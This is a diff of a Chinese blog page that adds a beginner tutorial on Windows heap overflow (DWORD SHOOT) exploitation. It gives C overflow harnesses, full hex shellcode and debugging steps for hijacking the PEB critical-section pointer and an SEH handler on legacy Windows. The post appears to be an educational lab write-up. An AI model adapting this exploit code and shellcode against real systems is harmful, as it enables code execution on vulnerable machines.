@@ -465,14 +465,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    294
+                    1.7k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    1 分
+                    7 分
                 </div>
                 
 
@@ -497,7 +497,7 @@
             <div id="articleContent">
                 <p>本文将介绍一些简单基础的入门堆攻击</p>
 <h2 id="DWORD-SHOOT"><a href="#DWORD-SHOOT" class="headerlink" title="DWORD SHOOT"></a>DWORD SHOOT</h2><p>DWORD SHOOT攻击利用堆溢出，通过空闲态堆块中的的双向链表指针，完成任意地址读写的操作</p>
-<p>其攻击原理如下，一个双向链表的中间节点摘除一般如下，而flink与blink分别位于堆块指针的0x0和0x8偏移处</p>
+<h3 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h3><p>其攻击原理如下，一个双向链表的中间节点摘除一般如下，而flink与blink分别位于堆块指针的0x0和0x8偏移处</p>
 <pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">remove</span> <span class="token punctuation">(</span>ListNode <span class="token operator">*</span> node<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
 	node <span class="token operator">-></span> blink<span class="token operator">-></span> flink <span class="token operator">=</span> node<span class="token operator">-></span> flink<span class="token punctuation">;</span>
 	node <span class="token operator">-></span> flink <span class="token operator">-></span> blink <span class="token operator">=</span> node<span class="token operator">-></span> blink<span class="token punctuation">;</span>
@@ -520,6 +520,108 @@
 	h2 <span class="token operator">=</span> <span class="token function">HeapAlloc</span><span class="token punctuation">(</span>hp<span class="token punctuation">,</span>HEAP_ZERO_MEMORY<span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
 <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="攻击示例"><a href="#攻击示例" class="headerlink" title="攻击示例"></a>攻击示例</h3><h4 id="PEB利用"><a href="#PEB利用" class="headerlink" title="PEB利用"></a>PEB利用</h4><p>Windows为了同步进程下的多个线程，使用了一些同步措施，如锁机制（lock）、信号量（semaphore）、临界区（critical section）等。许多操作都要用到这些同步机制。<br>当进程退出时，ExitProcess()函数要做很多善后工作，其中必然需要用到临界区函数RtlEnterCriticalSection()和RtLeaveCriticalSection()来同步线程防止“脏数据”的产生。</p>
+<p>而ExitProcess函数调用这两个临界区函数的方式比较独特，是通过PEB(进程环境块)偏移0x20处的函数指针进行的；同时在早期版本的windows下，PEB地址经常固定在0x7FFDF000处，便于程序调用(现在的OS均开启了ALSR，地址不再固定了)。</p>
+<p>因此，我们可以通过DWORD SHOOT的方式对0x7FFDF020处的RtEnterCriticalSection()指针进行修改，强制使他指向我们的shellcode，从而完成弹窗</p>
+<p>我们计划使用以下代码来完成堆溢出的操作，其中shellcode自定义，可以看到我们溢出的目标是h2在空闲态时的flink和blink，然后再通过allocate的方式实现对0x7FFDF024处指针的修改，从误导ExitProcess调用我们的shellcode</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+	HLOCAL h1 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> h2 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+	HANDLE hp<span class="token punctuation">;</span>
+	hp <span class="token operator">=</span> <span class="token function">HeapCreate</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x1000</span><span class="token punctuation">,</span><span class="token number">0x10000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	h1 <span class="token operator">=</span> <span class="token function">HeapAlloc</span><span class="token punctuation">(</span>hp<span class="token punctuation">,</span>HEAP_ZERO_MEMORY<span class="token punctuation">,</span><span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token comment">//__asm int 3 //used to break the process</span>
+	<span class="token function">memcpy</span><span class="token punctuation">(</span>h1<span class="token punctuation">,</span>shellcode<span class="token punctuation">,</span><span class="token number">0x200</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//overflow,0x200=512</span>
+	h2 <span class="token operator">=</span> <span class="token function">HeapAlloc</span><span class="token punctuation">(</span>hp<span class="token punctuation">,</span>HEAP_ZERO_MEMORY<span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>为了达成以上目的，我们需要通过调试来确定shellcode的起始位置，也就是h1的数据区。</p>
+<p><img src="/2026/06/14/dui-gong-ji-ru-men/1781497268722.png" alt="确认h1数据区地址"></p>
+<p>同时，为了避免ExitProcess在shellcode调用函数时的递归调用shellcode，我们需要在shellcode首部恢复函数指针值。顺带着我们可以通过fs寻找PEB，确定当前PEB是否固定地址</p>
+<p><img src="/2026/06/14/dui-gong-ji-ru-men/1781497412245.png"><img src="/2026/06/14/dui-gong-ji-ru-men/1781497452701.png" alt="函数指针"></p>
+<p>可以看到PEB确实固定在0x7ffdf000处，同时记住Enter的原始地址，便于shellcode中恢复。根据以上信息，构建shellcode如下</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">char</span> shellcode<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span>
+<span class="token string">"\x90\x90\x90\x90\x90\x90\x90\x90"</span>
+<span class="token string">"\x90\x90\x90\x90"</span>
+<span class="token comment">//repaire the pointer which shooted by heap over run</span>
+<span class="token string">"\xB8\x20\xF0\xFD\x7F"</span>  <span class="token comment">//MOV EAX,7FFDF020</span>
+<span class="token string">"\xBB\xE0\x7E\xF8\x77"</span>  <span class="token comment">//MOV EBX,77F87EE0 the address here may releated to your OS</span>
+<span class="token string">"\x89\x18"</span>				<span class="token comment">//MOV DWORD PTR DS:[EAX],EBX</span>
+<span class="token string">"\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"</span>
+<span class="token string">"\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"</span>
+<span class="token string">"\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"</span>
+<span class="token string">"\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"</span>
+<span class="token string">"\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"</span>
+<span class="token string">"\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"</span>
+<span class="token string">"\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"</span>
+<span class="token string">"\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"</span>
+<span class="token string">"\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"</span>
+<span class="token string">"\x53\x90\x90\x90\x90\x90\x68\x59\x73\x73\x78\x8B\xC4\x53\x50\x50"</span>
+<span class="token string">"\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90"</span>
+<span class="token string">"\x16\x01\x1A\x00\x00\x10\x00\x00"</span><span class="token comment">// head of the ajacent free block</span>
+<span class="token string">"\x88\x06\x36\x00\x20\xf0\xfd\x7f"</span><span class="token punctuation">;</span>
+<span class="token comment">//0x00360688 is the address of shellcode in first heap block, you have to make sure this address via debug </span>
+<span class="token comment">//0x7ffdf020 is the position in PEB which hold a pointer to RtlEnterCriticalSection()</span>
+<span class="token comment">//and will be called by ExitProcess() at last</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>运行程序，攻击结果如图</p>
+<p><img src="/2026/06/14/dui-gong-ji-ru-men/1781498065202.png" alt="攻击成功"></p>
+<h4 id="SEH利用"><a href="#SEH利用" class="headerlink" title="SEH利用"></a>SEH利用</h4><p>SEH链首可通过fs:[0x18]的方式进行定位，而SEH每一链项的结构体如下</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">//0x8 bytes (sizeof)</span>
+<span class="token keyword">struct</span> <span class="token class-name">_EXCEPTION_REGISTRATION_RECORD</span>
+<span class="token punctuation">&#123;</span>
+    <span class="token keyword">struct</span> <span class="token class-name">_EXCEPTION_REGISTRATION_RECORD</span><span class="token operator">*</span> Next<span class="token punctuation">;</span>                            <span class="token comment">//0x0</span>
+    <span class="token keyword">enum</span> <span class="token class-name">_EXCEPTION_DISPOSITION</span> <span class="token punctuation">(</span><span class="token operator">*</span>Handler<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">_EXCEPTION_RECORD</span><span class="token operator">*</span> arg1<span class="token punctuation">,</span> VOID<span class="token operator">*</span> arg2<span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">_CONTEXT</span><span class="token operator">*</span> arg3<span class="token punctuation">,</span> VOID<span class="token operator">*</span> arg4<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//0x4</span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>可以看到，链表偏移0x4处就是异常处理函数了，又因为对于异常处理是从链首到链尾依次match的，因此，我们只需要对链首处理函数进行修改并可以触发异常，便可以实现shellcode的执行了</p>
+<p>为进行地址修改，我们使用以下代码进行堆溢出操作，以完成Dword Shoot</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c">DWORD <span class="token function">Myhandler</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+	<span class="token function">ExitProcess</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+	HLOCAL h1 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> h2 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+	HANDLE hp<span class="token punctuation">;</span>
+	hp <span class="token operator">=</span> <span class="token function">HeapCreate</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x1000</span><span class="token punctuation">,</span><span class="token number">0x10000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	h1 <span class="token operator">=</span> <span class="token function">HeapAlloc</span><span class="token punctuation">(</span>hp<span class="token punctuation">,</span>HEAP_ZERO_MEMORY<span class="token punctuation">,</span><span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token comment">//__asm int 3;</span>
+	<span class="token function">memcpy</span><span class="token punctuation">(</span>h1<span class="token punctuation">,</span>shellcode<span class="token punctuation">,</span><span class="token number">0x200</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//overflow,0x200=512</span>
+	__try<span class="token punctuation">&#123;</span>
+	h2 <span class="token operator">=</span> <span class="token function">HeapAlloc</span><span class="token punctuation">(</span>hp<span class="token punctuation">,</span>HEAP_ZERO_MEMORY<span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token punctuation">&#125;</span>
+	<span class="token function">__except</span><span class="token punctuation">(</span><span class="token function">Myhandler</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
+	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>这里触发异常是由于shellcode的覆盖，导致堆全局变量被覆盖；同理我们在这里也要通过调试得到SEH链首地址，以及h1数据区地址</p>
+<p><img src="/2026/06/14/dui-gong-ji-ru-men/1781499716118.png" alt="修改位于12FF48处的指针"></p>
+<p>h1地址不再赘述，依然是0x360688，因此我们先构建shellcode如下</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">char</span> shellcode<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span>
+<span class="token string">"\x90\x90\x90\x90\x90\x90\x90\x90"</span>
+<span class="token string">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span>
+<span class="token string">"\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"</span>
+<span class="token string">"\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"</span>
+<span class="token string">"\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"</span>
+<span class="token string">"\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"</span>
+<span class="token string">"\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"</span>
+<span class="token string">"\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"</span>
+<span class="token string">"\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"</span>
+<span class="token string">"\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"</span>
+<span class="token string">"\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"</span>
+<span class="token string">"\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50"</span>
+<span class="token string">"\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90"</span>
+<span class="token string">"\x16\x01\x1A\x00\x00\x10\x00\x00"</span><span class="token comment">// head of the ajacent free block</span>
+<span class="token string">"\x88\x06\x36\x00\x60\xFF\x12\x00"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>尝试运行程序，却无弹窗出现；我们调试发现bug如图：原来是在node-&gt;flink-&gt;blink&#x3D;node-&gt;blink的过程中会破坏掉原有的shellcode，导致无法正确运行</p>
+<p><img src="/2026/06/14/dui-gong-ji-ru-men/1781500064000.png" alt="Bug"></p>
+<p>为此我们对shellcode首部进行修改，将第一行换为 <code>&quot;\xEB\x06\x90\x90\x90\x90\x90\x90&quot;</code>通过jmp跳过6个字节，规避干扰</p>
+<p>重新运行后，结果如下，shellcode执行成功</p>
+<p><img src="/2026/06/14/dui-gong-ji-ru-men/1781500442176.png"></p>
 
                 
             </div>
@@ -951,9 +1053,9 @@
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/15.jpg" class="responsive-img" alt="堆结构">
+                        <img src="/medias/featureimages/2.jpg" class="responsive-img" alt="堆结构简介">
                         
-                        <span class="card-title">堆结构</span>
+                        <span class="card-title">堆结构简介</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
